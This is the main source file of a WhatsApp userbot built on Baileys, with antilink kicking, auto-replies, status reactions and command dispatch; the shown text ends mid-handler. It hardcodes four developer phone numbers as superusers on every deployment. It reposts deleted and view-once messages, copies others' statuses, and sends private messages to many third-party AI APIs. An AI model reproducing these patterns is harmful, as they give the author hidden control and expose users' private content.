"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
        desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const baileys_1 = __importStar(require("@whiskeysockets/baileys"));
const logger_1 = __importDefault(require("@whiskeysockets/baileys/lib/Utils/logger"));
const logger = logger_1.default.child({});
logger.level = 'silent';
const pino = require("pino");
const boom_1 = require("@hapi/boom");
const conf = require("./set");
const axios = require("axios");
let fs = require("fs-extra");
let path = require("path");
const googleTTS = require('google-tts-api');
const FileType = require('file-type');
const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');

let evt = require(__dirname + "/keizzah/keith");
const { respond, sendMessage } = require(__dirname + "/keizzah/context");

let { reagir } = require(__dirname + "/keizzah/app");
var session = conf.session.replace(/Zokou-MD-WHATSAPP-BOT;;;=>/g, "");
const prefixe = conf.PREFIXE;

async function authentification() {
    try {
        if (!fs.existsSync(__dirname + "/auth/creds.json")) {
            console.log("Connecting...");
            await fs.writeFileSync(__dirname + "/auth/creds.json", atob(session), "utf8");
        }
        else if (fs.existsSync(__dirname + "/auth/creds.json") && session != "zokk") {
            await fs.writeFileSync(__dirname + "/auth/creds.json", atob(session), "utf8");
        }
    }
    catch (e) {
        console.log("Invalid Session " + e);
        return;
    }
}
authentification();
const store = (0, baileys_1.makeInMemoryStore)({
    logger: pino().child({ level: "silent", stream: "store" }),
});
setTimeout(() => {
    async function main() {
        const { version, isLatest } = await (0, baileys_1.fetchLatestBaileysVersion)();
        const { state, saveCreds } = await (0, baileys_1.useMultiFileAuthState)(__dirname + "/auth");
        const sockOptions = {
            version,
            logger: pino({ level: "silent" }),
            browser: ['Alpha-Md', "safari", "1.0.0"],
            printQRInTerminal: true,
            fireInitQueries: false,
            shouldSyncHistoryMessage: true,
            downloadHistory: true,
            syncFullHistory: true,
            generateHighQualityLinkPreview: true,
            markOnlineOnConnect: false,
            keepAliveIntervalMs: 30_000,
            auth: {
                creds: state.creds,
                keys: (0, baileys_1.makeCacheableSignalKeyStore)(state.keys, logger),
            },
            getMessage: async (key) => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id, undefined);
                    return msg.message || undefined;
                }
                return {
                    conversation: 'An Error Occurred, Repeat Command!'
                };
            }
        };
        const zk = (0, baileys_1.default)(sockOptions);
        store.bind(zk.ev);
        setInterval(() => { store.writeToFile("store.json"); }, 3000);
        const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
        let lastTextTime = 0;
        const messageDelay = 5000; 
        
        zk.ev.on("call", async callData => {
  if (conf.ANTICALL === 'yes') {
    const callId = callData[0].id;
    const callerId = callData[0].from;
    const currentTime = Date.now();

    if (currentTime - lastTextTime >= messageDelay) {
      try {
        await zk.rejectCall(callId, callerId);
        await zk.sendMessage(callerId, {
          text: conf.ANTICALL_MSG
        });
        lastTextTime = currentTime;
      } catch (error) {
        console.error('Error handling call:', error);
      }
    } else {
      console.log('Message not sent due to delay constraint');
    }
  }
});
        /*const isAnyBadWord = (message) => {
    // Load bad words from JSON file
    const badWordsPath = path.join(__dirname, 'database/antibad.json');
    const badWordsData = fs.readFileSync(badWordsPath);
    const badWords = JSON.parse(badWordsData).badWords;

    const messageLower = message.toLowerCase(); // Convert to lowercase for case-insensitive matching

    return badWords.some((word) => messageLower.includes(word));
};

zk.ev.on('messages.upsert', async (msg) => {
    try {
        const { messages } = msg;
        const message = messages[0];

        if (!message.message) return; // Skip empty messages

        const from = message.key.remoteJid; // Chat ID
        const sender = message.key.participant || message.key.remoteJid; // Sender ID
        const isGroup = from.endsWith('@g.us'); // Check if the message is from a group

        if (!isGroup) return; // Skip non-group messages

        const groupMetadata = await zk.groupMetadata(from); // Fetch group metadata
        const groupAdmins = groupMetadata.participants
            .filter((member) => member.admin)
            .map((admin) => admin.id);

        if (conf.GCF === 'yes') {
            const messageType = Object.keys(message.message)[0];
            const body =
                messageType === 'conversation'
                    ? message.message.conversation
                    : message.message[messageType]?.text || '';

            if (!body) return; // Skip if there's no text

            // Skip messages from admins
            if (groupAdmins.includes(sender)) return;

            // Check for any bad words
            if (isAnyBadWord(body)) {
                // Send a notification to the group
                await zk.sendMessage(from, {
                    text: `🚫 Bad word detected 🚫\n\n@${sender.split('@')[0]} using inappropriate language is prohibited.`,
                    mentions: [sender],
                });

                // Delete the message
                await zk.sendMessage(from, { delete: message.key });

                // Remove the sender from the group
                await zk.groupParticipantsUpdate(from, [sender], 'remove');
            }
        }
    } catch (err) {
        console.error('Error handling message:', err);
    }
});*/
        const isAnyLink = (message) => {
    // Regex pattern to detect any link
    const linkPattern = /https?:\/\/[^\s]+/;
    return linkPattern.test(message);
};

zk.ev.on('messages.upsert', async (msg) => {
    try {
        const { messages } = msg;
        const message = messages[0];

        if (!message.message) return; // Skip empty messages

        const from = message.key.remoteJid; // Chat ID
        const sender = message.key.participant || message.key.remoteJid; // Sender ID
        const isGroup = from.endsWith('@g.us'); // Check if the message is from a group

        if (!isGroup) return; // Skip non-group messages

        const groupMetadata = await zk.groupMetadata(from); // Fetch group metadata
        const groupAdmins = groupMetadata.participants
            .filter((member) => member.admin)
            .map((admin) => admin.id);

        if (conf.GCF === 'yes') {
            const messageType = Object.keys(message.message)[0];
            const body =
                messageType === 'conversation'
                    ? message.message.conversation
                    : message.message[messageType]?.text || '';

            if (!body) return; // Skip if there's no text

            // Skip messages from admins
            if (groupAdmins.includes(sender)) return;

            // Check for any link
            if (isAnyLink(body)) {
                // Send a notification to the group
                await zk.sendMessage(from, {
                    text: `🚫 Antilink detected 🚫\n\n@${sender.split('@')[0]} has been removed for sharing links.`,
                    mentions: [sender],
                });

                // Delete the message
                await zk.sendMessage(from, { delete: message.key });

                // Remove the sender from the group
                await zk.groupParticipantsUpdate(from, [sender], 'remove');
            }
        }
    } catch (err) {
        console.error('Error handling message:', err);
    }
});


        
        function createNotification(deletedMessage) {
  const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
  return `*😈 ${conf.BOT} ANTIDELETE👿*\n\n` +
    `*Time deleted🥀:* ${new Date().toLocaleString()}\n` +
    `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*powered by ${conf.OWNER_NAME}*\n\n`;
}

// Helper function to download media based on message type
async function downloadMessageMedia(message) {
  if (message.imageMessage) return await downloadMedia(message.imageMessage);
  if (message.videoMessage) return await downloadMedia(message.videoMessage);
  if (message.documentMessage) return await downloadMedia(message.documentMessage);
  if (message.audioMessage) return await downloadMedia(message.audioMessage);
  if (message.stickerMessage) return await downloadMedia(message.stickerMessage);
  if (message.voiceMessage) return await downloadMedia(message.voiceMessage);
  return null;
}

// Event listener for all incoming messages
zk.ev.on("messages.upsert", async m => {
  // Check if ANTIDELETE is enabled
  if (conf.ADM !== "yes") return;

  const { messages } = m;
  const ms = messages[0];
  if (!ms.message) return;

  const messageKey = ms.key;
  const remoteJid = messageKey.remoteJid;

  // Store received messages for future undelete reference
  if (!store.chats[remoteJid]) {
    store.chats[remoteJid] = [];
  }
  store.chats[remoteJid].push(ms);

  // Handle deleted messages
  if (ms.message.protocolMessage && ms.message.protocolMessage.type === 0) {
    const deletedKey = ms.message.protocolMessage.key;

    // Search for the deleted message in the stored messages
    const chatMessages = store.chats[remoteJid];
    const deletedMessage = chatMessages.find(msg => msg.key.id === deletedKey.id);

    if (deletedMessage) {
      try {
        // Create notification about the deleted message
        const notification = createNotification(deletedMessage);

        // Handle text messages
        if (deletedMessage.message.conversation) {
          await zk.sendMessage(remoteJid, {
            text: `${notification}*Message:* ${deletedMessage.message.conversation}`,
            mentions: [deletedMessage.key.participant]
          });
        }
        
        // Handle media messages
        else {
          let mediaBuffer = null;
          let mediaType = '';

          // Check if the deleted message is an image
          if (deletedMessage.message.imageMessage) {
            mediaBuffer = await downloadMedia(deletedMessage.message.imageMessage);
            mediaType = 'image';
            const imageMessage = deletedMessage.message.imageMessage;

            await zk.sendMessage(remoteJid, {
              image: mediaBuffer,
              caption: notification,
              mentions: [deletedMessage.key.participant],
              url: imageMessage.url,
              viewOnce: imageMessage.viewOnce
            });
          }
          
          // Check if the deleted message is a video
          else if (deletedMessage.message.videoMessage) {
            mediaBuffer = await downloadMedia(deletedMessage.message.videoMessage);
            mediaType = 'video';
            const videoMessage = deletedMessage.message.videoMessage;

            await zk.sendMessage(remoteJid, {
              video: mediaBuffer,
              caption: notification,
              mentions: [deletedMessage.key.participant],
              url: videoMessage.url,
              viewOnce: videoMessage.viewOnce,
              gifPlayback: videoMessage.gifPlayback
            });
          }
          
          // Check if the deleted message is an audio
          else if (deletedMessage.message.audioMessage) {
            mediaBuffer = await downloadMedia(deletedMessage.message.audioMessage);
            mediaType = 'audio';
            const audioMessage = deletedMessage.message.audioMessage;
            const mimeType = audioMessage.mimetype;

            if (mimeType === 'audio/mp4' || mimeType === 'audio/mpeg' || audioMessage.ptt) {
              await zk.sendMessage(remoteJid, {
                audio: mediaBuffer,
                caption: notification,
                mentions: [deletedMessage.key.participant]
              });
            }
          }
          
          // Check if the deleted message is a document (audio/video)
          else if (deletedMessage.message.documentMessage) {
            const documentMessage = deletedMessage.message.documentMessage;
            const mimeType = documentMessage.mimetype;

            if (mimeType === 'audio/mp4' || mimeType === 'audio/mpeg') {
              mediaBuffer = await downloadMedia(documentMessage);
              mediaType = 'audio';
              await zk.sendMessage(remoteJid, {
                audio: mediaBuffer,
                caption: notification,
                mentions: [deletedMessage.key.participant]
              });
            }
            else if (mimeType === 'video/mp4') {
              mediaBuffer = await downloadMedia(documentMessage);
              mediaType = 'video';
              await zk.sendMessage(remoteJid, {
                video: mediaBuffer,
                caption: notification,
                mentions: [deletedMessage.key.participant]
              });
            }
          }
          
          // Check if the deleted message is a sticker
          else if (deletedMessage.message.stickerMessage) {
            const stickerMessage = deletedMessage.message.stickerMessage;
            mediaBuffer = await downloadMedia(stickerMessage);
            mediaType = 'sticker';

            await zk.sendMessage(remoteJid, {
              sticker: mediaBuffer,
              caption: notification,
              mentions: [deletedMessage.key.participant],
              pack: 'ALPHA-MD',
              author: conf.OWNER_NAME,
              type: StickerTypes.FULL,
              categories: ['🤩', '🎉'],
              id: '12345',
              quality: 50,
              background: '#000000'
            });
          }
          
          // Handle voice message (same handling as audio)
          else if (deletedMessage.message.voiceMessage) {
            const voiceMessage = deletedMessage.message.voiceMessage;
            mediaBuffer = await downloadMedia(voiceMessage);
            mediaType = 'audio';

            await zk.sendMessage(remoteJid, {
              audio: mediaBuffer,
              caption: notification,
              mentions: [deletedMessage.key.participant]
            });
          }
        }
      } catch (error) {
        console.error('Error handling deleted message:', error);
      }
    }
  }
});
 
          
          
          // Check if the deleted message is a document (audio/video)
          
                    

    let repliedContacts = new Set();

zk.ev.on("messages.upsert", async m => {
  const { messages } = m;
  const ms = messages[0];
  
  if (!ms.message) {
    return;
  }

  const messageText = ms.message.conversation || ms.message.extendedTextMessage?.text || "";
  const remoteJid = ms.key.remoteJid;

  // Get the sender's JID and number
  const senderJid = ms.key.participant || ms.key.remoteJid;
  const senderNumber = senderJid.split('@')[0];

  // Update the auto-reply message dynamically
  const auto_reply_message = `@${senderNumber}\n${conf.GREET_MSG}`;

  // Check if the message exists and is a command to set a new auto-reply message with any prefix
  if (messageText.match(/^[^\w\s]/) && ms.key.fromMe) {
    const prefix = messageText[0]; // Detect the prefix
    const command = messageText.slice(1).split(" ")[0]; // Command after prefix
    const newMessage = messageText.slice(prefix.length + command.length).trim(); // New message content

    if (command === "setautoreply" && newMessage) {
      conf.GREET_MSG = newMessage;
      await zk.sendMessage(remoteJid, {
        text: `Auto-reply message has been updated to:\n"${newMessage}"`
      });
      return;
    }
  }

  // Check if auto-reply is enabled, contact hasn't received a reply, and it's a private chat
  if (conf.GREET === "yes" && !repliedContacts.has(remoteJid) && !ms.key.fromMe && !remoteJid.includes("@g.us")) {
    await zk.sendMessage(remoteJid, {
      text: auto_reply_message,
      mentions: [senderJid]
    });

    // Add contact to replied set to prevent repeat replies
    repliedContacts.add(remoteJid);
  }
});
    if (conf.AUTOBIO === 'yes') {
  setInterval(() => {
    const date = new Date();
    const formattedDate = date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' });
    const dayOfWeek = date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' });

    zk.updateProfileStatus(
      `${conf.BOT} is active 24/7\n\n${formattedDate} It's a ${dayOfWeek}.\n\n${conf.AUTOBIO_MSG}`
    );
  }, 10 * 1000);
}
            
const loveEmojis = ["❤️", "💖", "💘", "💝", "💓", "💌", "💕", "😎", "🔥", "💥", "💯", "✨", "🌟", "🌈", "⚡", "💎", "🌀", "👑", "🎉", "🎊", "🦄", "👽", "🛸", 
  "🚀", "🦋", "💫", "🍀", "🎶", "🎧", "🎸", "🎤", "🏆", "🏅", "🌍", "🌎", "🌏", "🎮", "🎲", "💪", 
  "🏋️", "🥇", "👟", "🏃", "🚴", "🚶", "🏄", "⛷️", "🕶️", "🧳", "🍿", "🍿", "🥂", "🍻", "🍷", "🍸", 
  "🥃", "🍾", "🎯", "⏳", "🎁", "🎈", "🎨", "🌻", "🌸", "🌺", "🌹", "🌼", "🌞", "🌝", "🌜", "🌙", 
  "🌚", "🍀", "🌱", "🍃", "🍂", "🌾", "🐉", "🐍", "🦓", "🦄", "🦋", "🦧", "🦘", "🦨", "🦡", "🐉", 
  "🐅", "🐆", "🐓", "🐢", "🐊", "🐠", "🐟", "🐡", "🦑", "🐙", "🦀", "🐬", "🦕", "🦖", "🐾", "🐕", 
  "🐈", "🐇", "🐾"];


let lastReactionTime = 0;

if (conf.AUTO_LIKE_STATUS === "yes") {
    console.log("AUTO_LIKE_STATUS is enabled. Listening for status updates...");

    zk.ev.on("messages.upsert", async (m) => {
        const { messages } = m;

        for (const message of messages) {
            // Check if the message is a status update
            if (message.key && message.key.remoteJid === "status@broadcast") {
                console.log("Detected status update from:", message.key.remoteJid);

                // Ensure throttling by checking the last reaction time
                const now = Date.now();
                if (now - lastReactionTime < 5000) {  // 5-second interval
                    console.log("Throttling reactions to prevent overflow.");
                    continue;
                }

                // Check if bot user ID is available
                const keith = zk.user && zk.user.id ? zk.user.id.split(":")[0] + "@s.whatsapp.net" : null;
                if (!keith) {
                    console.log("Bot's user ID not available. Skipping reaction.");
                    continue;
                }

                // Select a random love emoji
                const randomLoveEmoji = loveEmojis[Math.floor(Math.random() * loveEmojis.length)];

                // React to the status with the selected love emoji
                try {
                    await zk.sendMessage(message.key.remoteJid, {
                        react: {
                            key: message.key,
                            text: randomLoveEmoji, // Reaction emoji
                        },
                    }, {
                        statusJidList: [message.key.participant], // Add other participants if needed
                    });

                    // Log successful reaction and update the last reaction time
                    lastReactionTime = Date.now();
                    console.log(`Successfully reacted to status update by ${message.key.remoteJid} with ${randomLoveEmoji}`);

                    // Delay to avoid rapid reactions
                    await delay(2000); // 2-second delay between reactions
                } catch (error) {
                    console.error('Error reacting to status update:', error);
                }
            }
        }
    });
}

        
 



        
        zk.ev.on("messages.upsert", async (m) => {
            const { messages } = m;
            const ms = messages[0];
            if (!ms.message)
                return;
            const decodeJid = (jid) => {
                if (!jid)
                    return jid;
                if (/:\d+@/gi.test(jid)) {
                    let decode = (0, baileys_1.jidDecode)(jid) || {};
                    return decode.user && decode.server && decode.user + '@' + decode.server || jid;
                }
                else
                    return jid;
            };
            var mtype = (0, baileys_1.getContentType)(ms.message);
            var texte = mtype == "conversation" ? ms.message.conversation : mtype == "imageMessage" ? ms.message.imageMessage?.caption : mtype == "videoMessage" ? ms.message.videoMessage?.caption : mtype == "extendedTextMessage" ? ms.message?.extendedTextMessage?.text : mtype == "buttonsResponseMessage" ?
                ms?.message?.buttonsResponseMessage?.selectedButtonId : mtype == "listResponseMessage" ?
                ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId : mtype == "messageContextInfo" ?
                (ms?.message?.buttonsResponseMessage?.selectedButtonId || ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId || ms.text) : "";
            var origineMessage = ms.key.remoteJid;
            var idBot = decodeJid(zk.user.id);
            var servBot = idBot.split('@')[0];
            const verifGroupe = origineMessage?.endsWith("@g.us");
            var infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : "";
            var nomGroupe = verifGroupe ? infosGroupe.subject : "";
            var msgRepondu = ms.message.extendedTextMessage?.contextInfo?.quotedMessage;
            var auteurMsgRepondu = decodeJid(ms.message?.extendedTextMessage?.contextInfo?.participant);
            var mr = ms.message?.extendedTextMessage?.contextInfo?.mentionedJid;
            var utilisateur = mr ? mr : msgRepondu ? auteurMsgRepondu : "";
            var auteurMessage = verifGroupe ? (ms.key.participant ? ms.key.participant : ms.participant) : origineMessage;
            if (ms.key.fromMe) {
                auteurMessage = idBot;
            }
            var membreGroupe = verifGroupe ? ms.key.participant : '';
            
            const nomAuteurMessage = ms.pushName;
            const FranceKing = '254757835036';
            const FranceKing1 = '254751284190';
            const FranceKing2 = "254750948696";
            const FranceKing3 = '254742063632';
            
            const superUserNumbers = [servBot, FranceKing, FranceKing1, FranceKing2, FranceKing3, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
            const allAllowedNumbers = superUserNumbers;
            const superUser = allAllowedNumbers.includes(auteurMessage);
            var dev = [FranceKing, FranceKing1, FranceKing2, FranceKing3].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
            function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
            console.log("\t [][]...{KEITH-TECH}...[][]");
            console.log("=========== New Message ===========");
            if (verifGroupe) {
                console.log("Message from the group: " + nomGroupe);
            }
            console.log("Message sent by: " + "[" + nomAuteurMessage + " : " + auteurMessage.split("@s.whatsapp.net")[0] + " ]");
            console.log("Message type: " + mtype);
            console.log("------ Message Content ------");
            console.log(texte);
            function groupeAdmin(membreGroupe) {
                let admin = [];
                for (m of membreGroupe) {
                    if (m.admin == null)
                        continue;
                    admin.push(m.id);
                }
                return admin;
            }
            var etat = conf.ETAT;
            if (etat == 1) { await zk.sendPresenceUpdate("available", origineMessage); }
            else if (etat == 2) { await zk.sendPresenceUpdate("composing", origineMessage); }
            else if (etat == 4) { await zk.sendPresenceUpdate("sleeping", origineMessage); }
            else if (etat == 5) { await zk.sendPresenceUpdate("lying", origineMessage); }
            else if (etat == 6) { await zk.sendPresenceUpdate("fighting", origineMessage); }
            else if (etat == 7) { await zk.sendPresenceUpdate("hacking", origineMessage); }
            else if (etat == 8) { await zk.sendPresenceUpdate("laughing", origineMessage); }
            else if (etat == 3) { await zk.sendPresenceUpdate("recording", origineMessage); }
            else { await zk.sendPresenceUpdate("unavailable", origineMessage); }
            const mbre = verifGroupe ? await infosGroupe.participants : '';
            let admins = verifGroupe ? groupeAdmin(mbre) : '';
            const verifAdmin = verifGroupe ? admins.includes(auteurMessage) : false;
            var verifZokouAdmin = verifGroupe ? admins.includes(idBot) : false;
            const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
            const verifCom = texte ? texte.startsWith(prefixe) : false;
            const com = verifCom ? texte.slice(1).trim().split(/ +/).shift().toLowerCase() : false;
            const lien = conf.URL.split(',')
            function mybotpic() {
                const indiceAleatoire = Math.floor(Math.random() * lien.length);
                const lienAleatoire = lien[indiceAleatoire];
                return lienAleatoire;
            }
            var commandeOptions = {
                superUser, dev,
                verifGroupe,
                mbre,
                membreGroupe,
                verifAdmin,
                infosGroupe,
                nomGroupe,
                auteurMessage,
                nomAuteurMessage,
                idBot,
                verifZokouAdmin,
                prefixe,
                arg,
                repondre,
                mtype,
                groupeAdmin,
                msgRepondu,
                auteurMsgRepondu,
                ms,
                mybotpic
            };
            if (!superUser && origineMessage === auteurMessage && conf.AUTO_REACT === 'yes') {
    const emojis = ['❤', '💕', '😻', '🧡', '💛', '💚', '💙', '💜', '🖤', '❣', '💞', '💓', '💗', '💖', '💘', '💝', '💟', '♥', '💌', '🙂', '🤗', '😌', '😉', '😊', '🎊', '🎉', '🎁', '🎈', '👋'];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    zk.sendMessage(origineMessage, {
        'react': {
            'text': randomEmoji,
            'key': ms.key
        }
    });
}
            if (conf.AUTO_READ_MESSAGES === "yes") {
        zk.ev.on("messages.upsert", async m => {
          const {
            messages
          } = m;
          for (const message of messages) {
            if (!message.key.fromMe) {
              await zk.readMessages([message.key]);
            }
          }
        });
      }
            const badWords = ['stupid', 'idiot', 'fool', 'dumb', 'jerk']; // Add more bad words as needed

if (badWords.some(word => texte.includes(word)) && !superUser && origineMessage === auteurMessage && conf.AUTO_BLOCK === 'yes') {
  console.log(`Bad word detected in message: ${texte}`);

  try {
    await zk.sendMessage(auteurMessage, {
      text: "🚫 I am blocking you because you have violated Keith policies 🚫!"
    });
    await zk.updateBlockStatus(auteurMessage, 'block');
    console.log(`User ${auteurMessage} blocked successfully.`);
  } catch (error) {
    console.error(`Error blocking user ${auteurMessage}:`, error);
  }
} else {
  if (!badWords.some(word => texte.includes(word))) {
    console.log('No bad words detected.');
  }
  if (superUser) {
    console.log('Sender is a super user, not blocking.');
  }
  if (origineMessage !== auteurMessage) {
    console.log('Origin message is not from the author, not blocking.');
  }
  if (conf.AUTO_BLOCK !== 'yes') {
    console.log('Auto-block is not enabled.');
  }
}
            if (ms.key && ms.key.remoteJid === 'status@broadcast' && conf.AUTO_STATUS_REPLY === "yes") {
  const user = ms.key.participant;
  const text = `${conf.AUTO_STATUS_MSG}`;
  
  await zk.sendMessage(user, { 
    text: text,
    react: { text: '⚔️', key: ms.key }
  }, { quoted: ms });
            }
            if (ms.key && ms.key.remoteJid === "status@broadcast" && conf.AUTO_READ_STATUS === "yes") {
                await zk.readMessages([ms.key]);
            }
            if (ms.key && ms.key.remoteJid === 'status@broadcast' && conf.AUTO_DOWNLOAD_STATUS === "yes") {
    /* await zk.readMessages([ms.key]);*/
    if (ms.message.extendedTextMessage) {
        const stTxt = ms.message.extendedTextMessage.text;
        await zk.sendMessage(idBot, { text: stTxt }, { quoted: ms });
    } else if (ms.message.imageMessage) {
        const stMsg = ms.message.imageMessage.caption;
        const stImg = await zk.downloadAndSaveMediaMessage(ms.message.imageMessage);
        await zk.sendMessage(idBot, { image: { url: stImg }, caption: stMsg }, { quoted: ms });
    } else if (ms.message.videoMessage) {
        const stMsg = ms.message.videoMessage.caption;
        const stVideo = await zk.downloadAndSaveMediaMessage(ms.message.videoMessage);
        await zk.sendMessage(idBot, {
            video: { url: stVideo }, caption: stMsg
        }, { quoted: ms });
    }
}


            
            if (!superUser && origineMessage === auteurMessage && conf.CHATBOT_INBOX === 'yes') {
  try {
    const currentTime = Date.now();
    if (currentTime - lastTextTime < messageDelay) {
      console.log('Message skipped: Too many messages in a short time.');
      return;
    }

    // List of API endpoints
    const apis = [
      `https://bk9.fun/ai/blackbox?q=${encodeURIComponent(texte)}`,
      `https://api.siputzx.my.id/api/ai/bard?query=${encodeURIComponent(texte)}`,
      `https://api.siputzx.my.id/api/ai/blackboxai-pro?content=${encodeURIComponent(texte)}`,
      `https://api.siputzx.my.id/api/ai/blackboxai?content=${encodeURIComponent(texte)}`,
      `https://vapis.my.id/api/blackbox?q=${encodeURIComponent(texte)}`,
      `https://apis.davidcyriltech.my.id/blackbox?q=${encodeURIComponent(texte)}`,
      `https://api.siputzx.my.id/api/ai/deepseek-llm-67b-chat?content=${encodeURIComponent(texte)}`,
      `https://apis.davidcyriltech.my.id/ai/deepseek-v3?text=${encodeURIComponent(texte)}`,
      `https://apis.davidcyriltech.my.id/ai/deepseek-r1?text=${encodeURIComponent(texte)}`,
      `https://api.ryzendesu.vip/api/ai/deepseek?text=${encodeURIComponent(texte)}`,
      `https://vapis.my.id/api/openai?q=${encodeURIComponent(texte)}`,
      `https://vapis.my.id/api/gpt4o?q=${encodeURIComponent(texte)}`,
      `https://lance-frank-asta.onrender.com/api/gpt?q=${encodeURIComponent(texte)}`,
      `https://api.gurusensei.workers.dev/llama?prompt=${encodeURIComponent(texte)}`,
      `https://api.ryzendesu.vip/api/ai/v2/chatgpt?text=${encodeURIComponent(texte)}`,
      `https://api.dreaded.site/api/chatgpt?text=${encodeURIComponent(texte)}`,
      `https://api.giftedtech.my.id/api/ai/gpt4?apikey=gifted&q=${encodeURIComponent(texte)}`,
      `https://api.giftedtech.my.id/api/ai/gpt4v2?apikey=gifted&q=${encodeURIComponent(texte)}`,
      `https://api.giftedtech.my.id/api/ai/gpt4-o?apikey=gifted&q=${encodeURIComponent(texte)}`,
      `https://apis.davidcyriltech.my.id/ai/metaai?text=${encodeURIComponent(texte)}`,
      `https://api.siputzx.my.id/api/ai/meta-llama-33-70B-instruct-turbo?content=${encodeURIComponent(texte)}`,
      `https://vapis.my.id/api/Ilamav2?q=${encodeURIComponent(texte)}`,
      `https://apis.davidcyriltech.my.id/ai/llama3?text=${encodeURIComponent(texte)}`
    ];

    // Helper function to fetch data from APIs
    const fetchFromApis = async (apis) => {
      for (const api of apis) {
        try {
          const response = await axios.get(api);
          if (response.data) {
            return response.data;
          }
        } catch (error) {
          console.error(`Error with API: ${api}`, error.message);
        }
      }
      return null; // Return null if no API succeeds
    };

    // Fetch data from APIs
    const keith = await fetchFromApis(apis);

    if (keith) {
      const replyText = keith.BK9 || keith.answer || keith.result ||
        keith.message || keith.data || keith.response ||
        "No specific key matched, but API returned data.";

      await zk.sendMessage(origineMessage, { text: replyText });
      lastTextTime = Date.now(); // Update the last message time
    } else {
      console.error('No valid response received from APIs.');
    }
  } catch (error) {
    console.error('Error fetching chatbot response:', error);
  }
}
            if (!superUser && origineMessage === auteurMessage && conf.VOICE_CHATBOT_INBOX === 'yes') {
  try {
    const currentTime = Date.now(); // Ensure currentTime is defined

    if (currentTime - lastTextTime < messageDelay) {
      console.log('Message skipped: Too many messages in a short time.');
      return;
    }

    const fetchFromApis = async (apis) => {
      for (const api of apis) {
        try {
          const response = await axios.get(api);
          if (response.data) {
            return response.data;
          }
        } catch (error) {
          console.error(`Error with API: ${api}`, error.message);
        }
      }
      return null; // Return null if no API succeeds
    };

    // Fetch data from previously defined APIs
    const keith = await fetchFromApis(apis);

    if (keith && keith.success && keith.message) {
      // Use dynamic language for TTS
      const lang = conf.DEFAULT_LANGUAGE || 'en'; 
      const audioUrl = googleTTS.getAudioUrl(keith.message, {
        lang: lang,
        slow: false,
        host: 'https://translate.google.com'
      });

      // Send audio message response
      await zk.sendMessage(origineMessage, { audio: { url: audioUrl }, mimetype: 'audio/mp4', ptt: true });

      lastTextTime = Date.now(); // Update the last message time
    } else {
      console.error('No valid response received from APIs.');
    }
  } catch (error) {
    console.error('Error fetching chatbot response:', error);
  }
}

            

            

            if (verifCom) {
                const cd = evt.cm.find((keith) => keith.nomCom === (com));
                if (cd) {
                    try {
                        if ((conf.MODE).toLocaleLowerCase() != 'yes' && !superUser) {
                            return;
                        }
                        if (!superUser && origineMessage === auteurMessage && conf.PM_PERMIT === "yes") {
                            repondre("You don't have access to commands here"); return
                        }
                        
                        reagir(origineMessage, zk, ms, cd.reaction);
                        cd.fonction(origineMessage, zk, commandeOptions);
                    }
                    catch (e) {
                        console.log("😡😡 " + e);
                        zk.sendMessage(origineMessage, { text: "😡😡 " + e }, { quoted: ms });
                    }
                }
            }
        });
        /*zk.ev.on('group-participants.update', async (group) => {
  console.log("Group update event triggered:", group); // Log the group update event

  let ppgroup;
  try {
    ppgroup = await zk.profilePictureUrl(group.id, 'image'); // Fetch group profile picture
  } catch {
    ppgroup = 'https://ibb.co/7SKY0tg'; // Fallback image URL
  }

  try {
    const metadata = await zk.groupMetadata(group.id); // Fetch group metadata

    // Check if events are enabled
    if (conf.EVENTS === 'yes') {
      // Welcome new members
      if (group.action === 'add') {
        let msg = `👋 Hello\n`;
        let membres = group.participants;
        for (let membre of membres) {
          msg += ` *@${membre.split("@")[0]}* Welcome to Our Official Group,\n`;
        }
        msg += `You might want to read the group Description to avoid getting removed...`;

        await zk.sendMessage(group.id, {
          image: { url: ppgroup },
          caption: msg,
          mentions: membres,
        });
      }

      // Say goodbye to members who left
      else if (group.action === 'remove') {
        let msg = `One or some member(s) left the group;\n`;
        let membres = group.participants;
        for (let membre of membres) {
          msg += `@${membre.split("@")[0]}\n`;
        }

        await zk.sendMessage(group.id, {
          text: msg,
          mentions: membres,
        });
      }
    }
  } catch (e) {
    console.error("Error in group event handler:", e); // Log any errors
  }
});*/
        // Other imports and setup code...

// Import the group events module

// Rest of your code (e.g., connection.update, etc.)...
        
        zk.ev.on("contacts.upsert", async (contacts) => {
            const insertContact = (newContact) => {
                for (const contact of newContact) {
                    if (store.contacts[contact.id]) {
                        Object.assign(store.contacts[contact.id], contact);
                    }
                    else {
                        store.contacts[contact.id] = contact;
                    }
                }
                return;
            };
            insertContact(contacts);
        });
        zk.ev.on("connection.update", async (con) => {
